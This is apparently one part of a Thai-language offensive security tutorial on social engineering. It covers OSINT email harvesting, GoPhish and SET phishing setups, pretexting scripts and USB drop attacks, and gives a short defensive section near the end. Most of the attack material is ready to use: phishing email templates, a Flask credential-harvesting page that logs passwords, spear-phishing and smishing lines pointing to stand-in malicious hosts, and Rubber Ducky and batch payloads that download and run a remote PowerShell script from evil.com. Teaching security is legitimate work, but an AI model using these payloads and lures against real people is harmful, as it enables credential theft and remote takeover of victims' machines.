# Part 43: Social Engineering - วิศวกรรมสังคมและการหลอกลวง

## สารบัญ
1. [ทำความเข้าใจ Social Engineering](#1)
2. [OSINT - Open Source Intelligence](#2)
3. [Phishing Attacks](#3)
4. [Spear Phishing](#4)
5. [Vishing และ Smishing](#5)
6. [SET - Social Engineering Toolkit](#6)
7. [Pretexting](#7)
8. [USB Drop Attack](#8)
9. [การป้องกัน](#9)
10. [Lab Exercises](#10)

---

## 1. ทำความเข้าใจ Social Engineering

```
Social Engineering = การหลอกลวงมนุษย์เพื่อเข้าถึง information หรือระบบ
โดยไม่ใช้เทคนิคเฉพาะด้าน technical

Principles:
1. Authority - แสร้งว่าเป็น CEO/IT/police
2. Urgency - สร้างความเร่งด่วน
3. Social Proof - "เพื่อนร่วมงานคุณก็ทำแบบนี้"
4. Reciprocity - ให้สิ่งของเล็กน้อยก่อน แล้วขอฝ่าย
5. Liking - สร้างความไว้ใจก่อน
6. Scarcity - "โอกาสสุดท้าย"

Attack Types:
- Phishing (Email)
- Spear Phishing (Targeted)
- Vishing (Voice)
- Smishing (SMS)
- Baiting (USB drop)
- Pretexting
- Tailgating
```

---

## 2. OSINT - Open Source Intelligence

### เก็บข้อมูลเป้าหมาย

```bash
# 1. LinkedIn - หาข้อมูลพนักงาน
theHarvester -d company.com -b linkedin

# 2. Email harvesting
theHarvester -d company.com -b google,linkedin,bing,yahoo -l 500

# Output:
# [*] Emails found: 15
# john.doe@company.com
# jane.smith@company.com
# admin@company.com

# 3. หา email format
hunter.io - ดูรูปแบบ email
# {first}.{last}@company.com
# {first_initial}{last}@company.com

# 4. Phone numbers - White Pages
# Truecaller, เบอร์โทรจากเว็บ

# 5. Social media
# Facebook, Twitter, Instagram
# sherlock - หา username ในทุก platform
pip3 install sherlock-project
sherlock johndoe

# 6. Maltego - สร้าง relationship map
maltego
```

### Google Dorks สำหรับ OSINT

```bash
# หาข้อมูลบุคคล
# site:linkedin.com "company.com" AND ("engineer" OR "developer")

# หา email format
# site:company.com email filetype:pdf

# หา organizational structure
# site:company.com "org chart" OR "organizational chart"

# หา VPN และ remote access
# site:company.com ("vpn" OR "remote access" OR "citrix")

# หา job postings (technologies used)
# site:jobs.company.com
# site:indeed.com company.com
```

---

## 3. Phishing Attacks

### GoPhish - Phishing Framework

```bash
# ติดตั้ง GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip
chmod +x gophish
./gophish

# เปิด browser: https://localhost:3333
# Login: admin / (random password ใน output)

# Setup:
# 1. Sending Profile (SMTP settings)
# 2. Landing Page (phishing page)
# 3. Email Template
# 4. User Groups (targets)
# 5. Campaign

# Email Template ตัวอย่าง:
# Subject: กรุณายืนยันตัวตน - ระบบจะอัปเดต
# Body: เรียน {{.FirstName}},
#       กรุณา click link: {{.URL}}
```

### Phishing Email Templates

```html
<!-- Template 1: IT Security Alert -->
<html>
<body>
<h2>Security Alert - Immediate Action Required</h2>
<p>Dear {{FirstName}},</p>
<p>Our security system has detected suspicious activity in your account.
   Please verify your credentials immediately to prevent account lockout.</p>
<p><a href="{{PhishingURL}}">Click here to verify your account</a></p>
<p>This link expires in 24 hours.</p>
<p>IT Security Team</p>
</body>
</html>

<!-- Template 2: Password Reset -->
<html>
<body>
<h2>Password Reset Required</h2>
<p>Your company password expires in 24 hours.</p>
<p>Please reset it here: <a href="{{PhishingURL}}">Reset Password</a></p>
<p>If you do not reset your password, your account will be locked.</p>
</body>
</html>
```

### สร้าง Credential Harvesting Page

```python
# ใช้ SET (Social Engineering Toolkit)
setoolkit

# Menu:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# URL to clone: https://mail.company.com

# หรือใช้ Python
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return open('fake_login.html').read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # บันทึก credentials
    with open('creds.txt', 'a') as f:
        f.write(f'{username}:{password}\n')
    
    # Redirect ไปหน้าจริง (ลดการสงสัย)
    return redirect('https://real.company.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---

## 4. Spear Phishing

```python
# Spear Phishing = Phishing ที่เจาะจงเฉพาะบุคคล
# ใช้ข้อมูล OSINT ที่เก็บไว้บุคคลได้

# เช่น:
# - john.doe@company.com (จาก OSINT)
# - ทำงานที่ฝ่าย IT (LinkedIn)
# - ใช้ Cisco routers (จาก job posting)

# Email ที่ personalized
subject = f"RE: Cisco Router Firmware Update - Action Required"
body = f"""
Dear John,

As per our IT team's plan discussed last week,
we need to update the Cisco router firmware in your office.

Please download the update tool:
https://cisco-update.evil.com/fw_updater.exe

And run it with admin credentials.

Best regards,
IT Department
"""

# แนบ: เป็นตัวอย่างสำหรับการศึกษาเท่านั้น
```

---

## 5. Vishing และ Smishing

```bash
# Vishing = Voice Phishing (โทรศัพท์)

# Scripts ตัวอย่าง:
# - IT Support: "ได้รับรายงานว่าระบบของคุณมีปัญหา ต้องการรหัสผ่านยืนยันตัวตน"
# - Bank: "บัญชีของคุณถูก block บอกรหัส OTP"
# - Police: "มีหมายจับตัวคุณ"

# Tools:
# - Spooftel - Caller ID spoofing
# - SpoofCard
# - Google Voice

# Smishing = SMS Phishing
# - ผ่าน SMS แบงก์/ไปรษณีย์
# - Link แพง phishing page
# - Credential harvesting

# SMS Spoofing tools:
# - BulkSMS API
# - Twilio (legitimate, but can abuse)
# - SMSGateway

echo "SMS: กรุณา verify บัญชี: http://bank-security.evil.com/verify?token=12345"
```

---

## 6. SET - Social Engineering Toolkit

```bash
# เริ่ม SET
setoolkit

# Menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 99) Exit the Social-Engineer Toolkit

# Credential Harvester
# 1 -> 2 -> 3 -> 2 (clone a website)
# ใส่ URL: https://accounts.google.com
# ใส่ IP: 192.168.1.100
# SET จะสร้าง clone และรอกับ credentials

# Phishing email with PDF exploit
# 1 -> 2 -> 1 (Adobe PDF Embedded EXE Social Engineering)

# Java Applet Attack
# 1 -> 2 -> 1 -> 2

# Multi-Attack (combine several)
# 1 -> 2 -> 8

# Results:
# [*] We got a successful login!
# POSSIBLE USERNAME FIELD FOUND: email
# POSSIBLE PASSWORD FIELD FOUND: password
# username: victim@gmail.com
# password: VictimPassword123
```

---

## 7. Pretexting

```
Pretexting = สร้างสถานการณ์เท็จเพื่อหลอกลวง
ตัวอย่าง:

1. IT Support Pretext:
   - แสร้งเป็น IT Help Desk
   - "เรากำลังดูแลระบบ เผอิญได้รับแจ้งเตือนจากระบบ"
   - ขอ password เพื่อ reset

2. Vendor/Supplier:
   - "ผมเป็น tech support จาก Microsoft"
   - บอกว่าได้รับรายงานแล้วว่าระบบมีปัญหา
   - ขอให้ install software

3. New Employee:
   - แสร้งเป็นพนักงานใหม่
   - "ยังไม่เข้าใจระบบ ช่วยสอนให้หน่อยได้ไหม"

4. Executive Impersonation:
   - Email ย่อ CEO สั่ง CFO โอนเงิน
   - BEC (Business Email Compromise)
```

---

## 8. USB Drop Attack

```bash
# USB Drop = ทิ้ง USB เป็นกับ มีไฟล์อันตราย หวังว่า victim จะเสียบ USB

# วิธี 1: AutoRun (Windows XP era)
# autorun.inf ด้านใน USB
cat > autorun.inf << 'EOF'
[AutoRun]
open=shell.exe
icon=usb_icon.ico
label=Company Documents
EOF

# วิธี 2: Rubber Ducky (HID Attack)
# USB keystroke injection
# inject keystrokes เหมือนระบบเชื่อว่าเป็น keyboard

# Rubber Ducky script:
cat > payload.duck << 'EOF'
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -nop -c "IEX ((New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1'))"
ENTER
EOF

# วิธี 3: Malicious LNK file
python3 << 'EOF'
import os

# LNK file ที่แสร้งว่าเป็นเอกสาร Word
# แต่เมื่อคลิกจะ execute powershell
lnk_content = (
    'powershell -ep bypass -nop -w hidden '
    '-c "IEX ((New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\"))"'
)

with open('Q3_Report.lnk.bat', 'w') as f:
    f.write(f'@echo off\n{lnk_content}\n')
EOF
```

---

## 9. การป้องกัน

```bash
# Training:
# - Security Awareness Training สำหรับพนักงาน
# - Phishing simulations เพื่อสอนให้รู้จัก phishing

# Technical controls:
# - Email filtering (SPF, DKIM, DMARC)
# - MFA (รหัสผ่านอย่างเดียวไม่พอ)
# - Web filtering (block phishing domains)
# - USB restrictions (GPO)

# SPF/DKIM/DMARC setup
# TXT record: v=spf1 ip4:YOUR_IP include:_spf.google.com ~all
# DMARC: v=DMARC1; p=reject; rua=mailto:dmarc@company.com

# Verify email headers
curl -s -X POST https://mxtoolbox.com/emailheaders.aspx \
  --data 'emailHeader=EMAIL_HEADERS'

# ตรวจสอบ phishing indicators:
# - สแกน URL: https://www.virustotal.com
# - Email header analysis
# - Domain age: whois domain.com

whois suspicious-domain.com | grep -E '(Creation Date|Registrar)'
```

---

## 10. Lab Exercises

### Lab 1: GoPhish Campaign

```bash
# 1. Setup GoPhish
./gophish &
# Login: https://localhost:3333

# 2. Create Sending Profile
# Host: smtp.gmail.com:587
# Username: your-email@gmail.com
# Password: App Password

# 3. Create Landing Page
# Clone: https://outlook.office365.com

# 4. Create Email Template
# Subject: Your Microsoft 365 account requires action
# Body: สร้าง email เหมือนของจริง

# 5. Create Users Group
# Import CSV: First Name, Last Name, Email, Position

# 6. Launch Campaign
# ดูสถิติ: Opens, Clicks, Submitted Data
```

### Lab 2: OSINT Target Profile

```bash
# เป้าหมาย: yourself หรือบริษัทที่ได้รับอนุญาต

# 1. Email harvesting
theHarvester -d target-company.com -b google,linkedin -l 200

# 2. Subdomain enumeration
findomain -t target-company.com

# 3. Employee info (LinkedIn)
curl 'https://api.linkedin.com/v2/search' -H 'Authorization: Bearer TOKEN'

# 4. Build target profile
echo "Name: John Doe"
echo "Email: john.doe@company.com"
echo "Title: Senior IT Engineer"
echo "Technologies: Cisco, AWS, Linux"
echo "Phone: +66-XX-XXX-XXXX"
echo "LinkedIn: linkedin.com/in/johndoe"
```

---

## สรุป

| Attack | เครื่องมือ | สิ่งที่ต้องการ |
|--------|----------|---------------|
| Phishing | GoPhish, SET | Email list |
| Spear Phishing | Custom email | OSINT data |
| Vishing | Phone | Script |
| USB Drop | Rubber Ducky | Physical access |
| OSINT | theHarvester, Maltego | Domain name |
| Credential Harvest | GoPhish landing page | Phishing email |

---

**ต่อไป:** [Part 44 - Post Exploitation Advanced](Part-44-Post-Exploitation-Advanced.md)
